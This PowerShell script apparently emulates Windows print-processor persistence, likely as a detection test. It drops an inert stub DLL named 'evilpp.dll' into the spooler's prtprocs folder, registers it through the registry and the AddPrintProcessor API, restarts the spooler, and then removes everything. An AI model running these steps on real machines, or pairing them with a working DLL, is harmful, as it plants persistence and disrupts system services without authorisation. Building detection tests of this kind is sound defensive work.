$ppDll = "$env:TEMP\evilpp.dll"
$pe = [byte[]]@(0x4D, 0x5A, 0x90, 0x00) + (New-Object byte[] 2044)
$exp = [System.Text.Encoding]::ASCII.GetBytes("InitializePrintProcessor")
[Array]::Copy($exp, 0, $pe, 512, $exp.Length)
try { [System.IO.File]::WriteAllBytes($ppDll, $pe) } catch {}
try { Copy-Item $ppDll "$env:SYSTEMROOT\System32\spool\prtprocs\x64\evilpp.dll" -Force -ErrorAction Stop } catch {}

$ppKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\EvilPrintProc"
try {
    New-Item -Path $ppKey -Force -ErrorAction Stop | Out-Null
    New-ItemProperty -Path $ppKey -Name "Driver" -Value "evilpp.dll" -PropertyType String -Force -ErrorAction Stop | Out-Null
} catch {}

& net.exe stop spooler 2>&1 | Out-Null
& net.exe start spooler 2>&1 | Out-Null

if (-not ('PrintProc' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class PrintProc {
        [DllImport("winspool.drv", CharSet=CharSet.Unicode, SetLastError=true)]
        public static extern bool AddPrintProcessor(string server, string env, string path, string name);
        [DllImport("winspool.drv", CharSet=CharSet.Unicode, SetLastError=true)]
        public static extern bool DeletePrintProcessor(string server, string env, string name);
    }
'@
}

[PrintProc]::AddPrintProcessor($null, "Windows x64", "evilpp.dll", "EvilPP") | Out-Null
[PrintProc]::DeletePrintProcessor($null, "Windows x64", "EvilPP") | Out-Null

Remove-Item $ppKey -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $ppDll -Force -ErrorAction SilentlyContinue
Remove-Item "$env:SYSTEMROOT\System32\spool\prtprocs\x64\evilpp.dll" -Force -ErrorAction SilentlyContinue
